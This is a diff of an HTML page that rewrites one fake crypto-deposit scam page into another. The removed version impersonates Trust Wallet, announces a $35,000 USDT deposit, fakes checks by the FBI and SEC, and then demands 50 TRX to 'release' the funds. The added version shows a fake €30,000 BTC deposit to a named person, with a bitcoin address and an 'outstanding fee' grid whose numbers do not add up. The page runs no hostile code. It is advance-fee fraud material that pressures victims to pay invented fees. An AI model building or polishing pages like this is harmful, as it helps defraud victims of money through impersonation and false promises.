@@ -1,304 +1,248 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Crypto Wallet</title>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1" />
+    <title>BTC Transaction</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=DM+Sans:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
-            min-height: 100vh;
-            color: #ffffff;
-        }
-        
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-        
-        .header {
-            text-align: center;
-            padding: 40px 0;
-            border-bottom: 1px solid #333;
-        }
-        
-        .logo {
-            font-size: 24px;
-            font-weight: bold;
-            color: #00d4aa;
-            margin-bottom: 10px;
-        }
-        
-        .balance-card {
-            background: linear-gradient(145deg, #1e1e2e 0%, #2a2a3e 100%);
-            border-radius: 20px;
-            padding: 40px;
-            margin: 30px 0;
-            text-align: center;
-            border: 1px solid #333;
-        }
-        
-        .balance-label {
-            color: #888;
-            font-size: 14px;
-            margin-bottom: 10px;
-        }
-        
-        .balance-amount {
-            font-size: 48px;
-            font-weight: bold;
-            color: #00d4aa;
-        }
-        
-        .notification {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: linear-gradient(145deg, #1a472a 0%, #2d5a3d 100%);
-            border: 2px solid #00d4aa;
-            border-radius: 15px;
-            padding: 30px;
-            max-width: 400px;
-            text-align: center;
-            cursor: pointer;
-            z-index: 1000;
-            animation: pulse 2s infinite;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { box-shadow: 0 0 20px rgba(0, 212, 170, 0.3); }
-            50% { box-shadow: 0 0 40px rgba(0, 212, 170, 0.6); }
-        }
-        
-        .notification h3 {
-            color: #00d4aa;
-            margin-bottom: 15px;
-            font-size: 20px;
-        }
-        
-        .notification p {
-            color: #fff;
-            line-height: 1.6;
-        }
-        
-        .notification .click-text {
-            color: #00d4aa;
-            font-weight: bold;
-            margin-top: 15px;
-            text-decoration: underline;
-        }
-        
-        .overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.9);
-            z-index: 999;
-        }
-        
-        .loading-modal {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: linear-gradient(145deg, #0f0f1a 0%, #1a1a2e 100%);
-            border: 2px solid #333;
-            border-radius: 20px;
-            padding: 50px;
-            max-width: 450px;
-            width: 90%;
-            text-align: center;
-            z-index: 1001;
-        }
-        
-        .loading-modal h2 {
-            color: #00d4aa;
-            margin-bottom: 30px;
-            font-size: 24px;
-        }
-        
-        .status-text {
-            color: #fff;
-            font-size: 16px;
-            margin: 20px 0;
-            min-height: 50px;
-        }
-        
-        .progress-bar {
-            width: 100%;
-            height: 8px;
-            background: #333;
-            border-radius: 4px;
-            overflow: hidden;
-            margin: 20px 0;
-        }
-        
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00d4aa 0%, #00ff88 100%);
-            width: 0%;
-            transition: width 0.5s ease;
-        }
-        
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #333;
-            border-top: 4px solid #00d4aa;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .error-modal {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: linear-gradient(145deg, #2a1a1a 0%, #3d2020 100%);
-            border: 2px solid #ff4444;
-            border-radius: 20px;
-            padding: 40px;
-            max-width: 450px;
-            width: 90%;
-            text-align: center;
-            z-index: 1001;
-        }
-        
-        .error-modal h2 {
-            color: #ff4444;
-            margin-bottom: 20px;
-            font-size: 22px;
-        }
-        
-        .error-modal .warning-icon {
-            font-size: 60px;
-            margin-bottom: 20px;
-        }
-        
-        .error-modal p {
-            color: #fff;
-            line-height: 1.8;
-            font-size: 15px;
-        }
-        
-        .requirement-box {
-            background: #1a1a2e;
-            border: 1px solid #ff8800;
-            border-radius: 10px;
-            padding: 20px;
-            margin-top: 25px;
-        }
-        
-        .requirement-box h4 {
-            color: #ff8800;
-            margin-bottom: 10px;
-        }
-        
-        .requirement-box .amount {
-            font-size: 28px;
-            color: #00d4aa;
-            font-weight: bold;
-        }
+      :root {
+        --font-display: 'Outfit', sans-serif;
+        --font-body: 'DM Sans', sans-serif;
+        --background: #060714;
+        --foreground: #f8fafc;
+        --card: #0d1025;
+        --primary: #22c55e;
+        --primary-foreground: #052e16;
+        --muted-foreground: #94a3b8;
+        --border: #1e293b;
+      }
+      * { margin: 0; padding: 0; box-sizing: border-box; }
+      body {
+        font-family: var(--font-body);
+        background: var(--background);
+        color: var(--foreground);
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 16px;
+      }
+      h1, h2, h3 { font-family: var(--font-display); font-weight: 700; }
+      .container { width: 100%; max-width: 400px; min-height: 600px; }
+      .hidden { display: none; }
+      
+      /* Loader */
+      .loader-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 600px; }
+      .spinner { width: 96px; height: 96px; border: 4px solid rgba(34, 197, 94, 0.2); border-top-color: #22c55e; border-radius: 50%; animation: spin 1s linear infinite; }
+      @keyframes spin { to { transform: rotate(360deg); } }
+      .loader-text { margin-top: 32px; color: var(--primary); font-size: 18px; font-weight: 500; letter-spacing: 0.05em; }
+      
+      /* Notification Screen */
+      .notification-screen { padding: 48px 0 24px; }
+      .notification-header { text-align: center; margin-bottom: 32px; }
+      .notification-icon { width: 80px; height: 80px; background: rgba(34, 197, 94, 0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; border: 1px solid rgba(34, 197, 94, 0.5); }
+      .notification-icon svg { width: 40px; height: 40px; color: var(--primary); }
+      .notification-title { font-size: 24px; color: white; margin-bottom: 8px; }
+      .notification-subtitle { color: var(--muted-foreground); font-size: 14px; padding: 0 24px; }
+      
+      /* Wallet Card */
+      .wallet-card { background: linear-gradient(145deg, #0f1229, #080b18); border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); padding: 24px; margin-bottom: 24px; }
+      .amount-label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted-foreground); font-weight: 600; margin-bottom: 4px; }
+      .amount-value { font-size: 36px; font-weight: 700; color: white; font-family: var(--font-display); }
+      .separator { height: 1px; background: rgba(255,255,255,0.05); margin: 20px 0; }
+      .info-label { font-size: 10px; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted-foreground); font-weight: 600; margin-bottom: 4px; }
+      .info-value { font-size: 14px; color: white; font-weight: 500; }
+      .address-box { background: rgba(0,0,0,0.3); padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05); margin-top: 8px; }
+      .address-text { font-family: monospace; font-size: 12px; color: rgba(34, 197, 94, 0.8); word-break: break-all; }
+      
+      /* Button */
+      .confirm-btn { width: 100%; padding: 16px; font-size: 18px; font-weight: 600; background: var(--primary); color: var(--primary-foreground); border: none; border-radius: 12px; cursor: pointer; transition: all 0.2s; }
+      .confirm-btn:hover { background: #16a34a; transform: translateY(-2px); }
+      
+      /* Detail Screen */
+      .detail-screen { padding: 24px 0; }
+      .detail-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 24px; }
+      .header-icon { width: 40px; height: 40px; background: rgba(255,255,255,0.05); border-radius: 50%; display: flex; align-items: center; justify-content: center; border: 1px solid rgba(255,255,255,0.1); }
+      .header-title { font-size: 16px; color: rgba(255,255,255,0.9); }
+      
+      .amount-section { text-align: center; margin-bottom: 32px; }
+      .wallet-icon { width: 64px; height: 64px; background: rgba(34, 197, 94, 0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 16px; border: 1px solid rgba(34, 197, 94, 0.2); }
+      .wallet-icon svg { width: 32px; height: 32px; color: var(--primary); }
+      .big-amount { font-size: 48px; font-weight: 700; color: white; margin-bottom: 8px; }
+      .amount-badge { display: inline-block; background: rgba(255,255,255,0.05); padding: 4px 12px; border-radius: 999px; font-size: 12px; color: var(--muted-foreground); border: 1px solid rgba(255,255,255,0.05); }
+      
+      /* Status Steps */
+      .status-steps { padding-left: 32px; margin-bottom: 32px; position: relative; }
+      .status-steps::before { content: ''; position: absolute; left: 12px; top: 8px; bottom: 8px; width: 2px; background: rgba(255,255,255,0.1); }
+      .status-step { position: relative; padding-bottom: 32px; }
+      .status-step:last-child { padding-bottom: 0; }
+      .step-dot { position: absolute; left: -32px; width: 24px; height: 24px; background: var(--primary); border-radius: 50%; border: 4px solid var(--background); display: flex; align-items: center; justify-content: center; }
+      .step-dot svg { width: 12px; height: 12px; color: white; }
+      .step-dot.pulse { animation: pulse 2s infinite; }
+      @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+      .step-content { display: flex; justify-content: space-between; align-items: flex-start; }
+      .step-title { font-size: 14px; font-weight: 700; color: white; }
+      .step-subtitle { font-size: 12px; color: var(--primary); margin-top: 2px; }
+      .step-time { font-size: 12px; color: var(--muted-foreground); font-family: monospace; }
+      .step-badge { display: flex; align-items: center; gap: 4px; background: rgba(34, 197, 94, 0.1); padding: 2px 8px; border-radius: 4px; font-size: 12px; color: var(--primary); }
+      
+      /* Fee Grid */
+      .fee-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; background: rgba(0,0,0,0.2); padding: 12px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.05); }
+      .fee-item { padding-left: 12px; border-left: 1px solid rgba(255,255,255,0.05); }
+      .fee-item:first-child { padding-left: 0; border-left: none; }
+      .fee-label { font-size: 10px; text-transform: uppercase; color: var(--muted-foreground); font-weight: 700; margin-bottom: 4px; }
+      .fee-value { font-size: 14px; font-family: monospace; color: white; }
+      .fee-value.green { color: var(--primary); }
+      
+      .tx-footer { background: rgba(255,255,255,0.05); padding: 12px 20px; border-top: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; margin: 20px -24px -24px; border-radius: 0 0 16px 16px; }
+      .tx-label { font-size: 12px; color: var(--muted-foreground); }
+      .tx-id { font-size: 12px; font-family: monospace; color: rgba(255,255,255,0.5); }
     </style>
-</head>
-<body>
+  </head>
+  <body>
     <div class="container">
-        <div class="header">
-            <div class="logo">🔐 TRUST WALLET</div>
-            <p style="color: #888;">Secure Crypto Wallet</p>
-        </div>
-        
-        <div class="balance-card">
-            <div class="balance-label">Total Balance</div>
-            <div class="balance-amount">$0.00</div>
-            <p style="color: #888; margin-top: 15px;">USDT</p>
-        </div>
-    </div>
-    
-    <div class="overlay" id="overlay"></div>
-    
-    <div class="notification" id="notification" onclick="startVerification()">
-        <h3>💰 Deposit Received!</h3>
-        <p>Dear user, you have successfully received a deposit of <strong style="color: #00ff88;">$35,000 USDT</strong></p>
-        <p class="click-text">👆 Click to open</p>
-    </div>
-    
-    <div class="loading-modal" id="loadingModal">
-        <h2>🔒 System Verification</h2>
+      <!-- Loading Screen -->
+      <div id="loading-screen" class="loader-screen">
         <div class="spinner"></div>
-        <div class="status-text" id="statusText">Initializing...</div>
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
+        <p class="loader-text">Processing Securely...</p>
+      </div>
+
+      <!-- Notification Screen -->
+      <div id="notification-screen" class="notification-screen hidden">
+        <div class="notification-header">
+          <div class="notification-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M19 14l-7 7m0 0l-7-7m7 7V3"/></svg>
+          </div>
+          <h1 class="notification-title">Incoming Deposit</h1>
+          <p class="notification-subtitle">You have received a BTC deposit that is awaiting confirmation.</p>
         </div>
-    </div>
-    
-    <div class="error-modal" id="errorModal">
-        <div class="warning-icon">⚠️</div>
-        <h2>🚨 Security Alert</h2>
-        <p>There are too many hackers trying to steal this money 💰 so the Security Exchange Commission can't release the funds.</p>
-        <div class="requirement-box">
-            <h4>⚡ Requirement</h4>
-            <p style="margin-bottom: 10px;">50 TRX needed to clear out all past records so that the payment can be new again.</p>
-            <div class="amount">50 TRX</div>
-            <p style="color: #888; margin-top: 10px; font-size: 13px;">This is the only way user can receive it</p>
+
+        <div class="wallet-card">
+          <div class="amount-label">Amount</div>
+          <div class="amount-value">€30,000</div>
+          
+          <div class="separator"></div>
+          
+          <div style="margin-bottom: 16px;">
+            <div class="info-label">Receiver Name</div>
+            <div class="info-value">Jose maria Quinones Mazaneque</div>
+          </div>
+          
+          <div>
+            <div class="info-label">Wallet Address</div>
+            <div class="address-box">
+              <div class="address-text">bc1q0klpr76433npp3q8gfwtqyqhy5hy9y0uqfjmum</div>
+            </div>
+          </div>
         </div>
+
+        <button class="confirm-btn" onclick="showDetails()">Confirm Transaction</button>
+      </div>
+
+      <!-- Detail Screen -->
+      <div id="detail-screen" class="detail-screen hidden">
+        <div class="detail-header">
+          <div class="header-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
+          </div>
+          <h2 class="header-title">A Cartera sin etiqueta</h2>
+          <div class="header-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><circle cx="12" cy="5" r="1"/><circle cx="12" cy="12" r="1"/><circle cx="12" cy="19" r="1"/></svg>
+          </div>
+        </div>
+
+        <div class="amount-section">
+          <div class="wallet-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"/></svg>
+          </div>
+          <div class="big-amount">€30,000</div>
+          <span class="amount-badge">Bitcoin Transaction</span>
+        </div>
+
+        <div class="status-steps">
+          <div class="status-step">
+            <div class="step-dot">
+              <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="3"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg>
+            </div>
+            <div class="step-content">
+              <div>
+                <div class="step-title">Solicitud procesada</div>
+                <div class="step-subtitle">Completado con éxito</div>
+              </div>
+              <span class="step-time">10:42 AM</span>
+            </div>
+          </div>
+          
+          <div class="status-step">
+            <div class="step-dot pulse">
+              <div style="width: 8px; height: 8px; background: white; border-radius: 50%;"></div>
+            </div>
+            <div class="step-content">
+              <div>
+                <div class="step-title">Pendiente</div>
+                <div class="step-subtitle">Awaiting network confirmation</div>
+              </div>
+              <span class="step-badge">
+                <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>
+                Confirming
+              </span>
+            </div>
+          </div>
+        </div>
+
+        <div class="wallet-card">
+          <div style="margin-bottom: 20px;">
+            <div class="info-label">Address</div>
+            <div class="info-value" style="font-family: monospace; font-size: 12px; color: rgba(255,255,255,0.8);">bc1q0klpr76433npp3q8gfwtqyqhy5hy9y0uqfjmum</div>
+          </div>
+          
+          <div class="separator"></div>
+          
+          <div style="margin-bottom: 20px;">
+            <div class="info-label">Receiver</div>
+            <div class="info-value">Jose maria Quinones Mazaneque</div>
+          </div>
+          
+          <div class="separator"></div>
+          
+          <div class="fee-grid">
+            <div class="fee-item">
+              <div class="fee-label">Total Fee</div>
+              <div class="fee-value">€450</div>
+            </div>
+            <div class="fee-item">
+              <div class="fee-label">Paid</div>
+              <div class="fee-value green">€150</div>
+            </div>
+            <div class="fee-item">
+              <div class="fee-label">Left</div>
+              <div class="fee-value">€350</div>
+            </div>
+          </div>
+          
+          <div class="tx-footer">
+            <span class="tx-label">Transaction ID</span>
+            <span class="tx-id">8f3a...2b9c</span>
+          </div>
+        </div>
+      </div>
     </div>
 
     <script>
-        // Show notification after 3 seconds
-        setTimeout(function() {
-            document.getElementById('overlay').style.display = 'block';
-            document.getElementById('notification').style.display = 'block';
-        }, 3000);
-        
-        function startVerification() {
-            document.getElementById('notification').style.display = 'none';
-            document.getElementById('loadingModal').style.display = 'block';
-            
-            var statusText = document.getElementById('statusText');
-            var progressFill = document.getElementById('progressFill');
-            
-            var steps = [
-                { text: "🔍 Confirmation from FBI...", progress: 25, time: 0 },
-                { text: "✅ Validating with Security Exchange Commission...", progress: 50, time: 4000 },
-                { text: "🔐 Accessing from Trust Wallet...", progress: 75, time: 8000 },
-                { text: "⏳ Finalizing transaction...", progress: 95, time: 12000 }
-            ];
-            
-            steps.forEach(function(step) {
-                setTimeout(function() {
-                    statusText.innerHTML = step.text;
-                    progressFill.style.width = step.progress + '%';
-                }, step.time);
-            });
-            
-            // Show error after 14 seconds
-            setTimeout(function() {
-                document.getElementById('loadingModal').style.display = 'none';
-                document.getElementById('errorModal').style.display = 'block';
-            }, 14000);
-        }
+      // Show notification after 3 seconds
+      setTimeout(function() {
+        document.getElementById('loading-screen').classList.add('hidden');
+        document.getElementById('notification-screen').classList.remove('hidden');
+      }, 3000);
+
+      // Show details when confirm is clicked
+      function showDetails() {
+        document.getElementById('notification-screen').classList.add('hidden');
+        document.getElementById('detail-screen').classList.remove('hidden');
+      }
     </script>
-</body>
+  </body>
 </html>
